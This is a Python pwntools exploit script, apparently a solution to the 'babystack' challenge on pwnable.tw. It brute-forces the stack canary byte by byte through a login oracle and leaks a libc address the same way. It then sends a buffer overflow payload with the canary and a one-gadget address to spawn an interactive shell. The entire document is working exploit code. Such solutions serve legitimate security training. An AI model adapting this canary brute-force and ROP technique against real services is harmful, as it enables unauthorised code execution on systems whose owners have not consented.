from pwn import *
import pdb
import sys


def login(pwd):
    p.sendlineafter('>> ', '1')
    p.sendlineafter('Your passowrd :', pwd)
    cont = p.recvline()

    return False if 'Failed' in cont else True


def logout():
    p.sendlineafter('>> ', '1')


def EXIT():
    p.sendlineafter('>> ', '2')


def read_input(cont, op=''):
    p.sendlineafter('>> ', '3')
    p.sendlineafter('Copy :', cont + op)


def brude(sz=0x10):
    _cont = ''
    for idx in range(sz):
        for c in range(1, 255):
            # print('idx: {}, c: {}'.format(idx, c))
            if c == 10:
                continue
            __cont = _cont + chr(c)
            if login(__cont):
                print('idx: {}, enumc:{:#x}'.format(idx, c))
                logout()
                _cont = __cont
                break

    return _cont


DEBUG = False

# context.proxy = (socks.HTTP, '192.168.152.1', 19999)

if DEBUG:
    p = process('/home/len/pwnable/babystack')
    elf = ELF('/home/len/pwnable/glibcs/glibcs/lib/libc.so.6')
else:
    p = remote('chall.pwnable.tw', 10205)
    elf = ELF('/home/len/pwnable/libc_64.so.6')

gadget_offset = 0x4526A
_IO_2_1_stdout_offset = 0x1ec6a0


if __name__ == '__main__':
    while True:
        canary = brude()
        if len(canary) != 16:
            p.close()
            p = remote('chall.pwnable.tw', 10205)
            continue
        else:
            print(canary.encode('hex'))

            # for leak libc_address
            p.sendlineafter('>> ', 'a')
            login('')
            read_input('a' * 0x3f, op='1')
            _IO_2_1_stdout_addr = u64(brude(8).ljust(8, '\0'))
            print('_IO_2_1_stdout_addr: {:#x}'.format(_IO_2_1_stdout_addr))
            libc_base = _IO_2_1_stdout_addr - _IO_2_1_stdout_offset
            print('libc_base: {:#x}'.format(libc_base))
            if libc_base % 0x1000 !=0:
                continue
            

            # payload
            gadget_addr = libc_base + gadget_offset
            print('gadget_addr: {:#x}'.format(gadget_addr))
            pdb.set_trace()
            login('\x00'.ljust(0x40, 'a') + canary + 'a' * 0x18 + p64(gadget_addr) +
                'c' * (0xd))
            read_input('b' * 0x3f, '2')
            p.interactive()
            break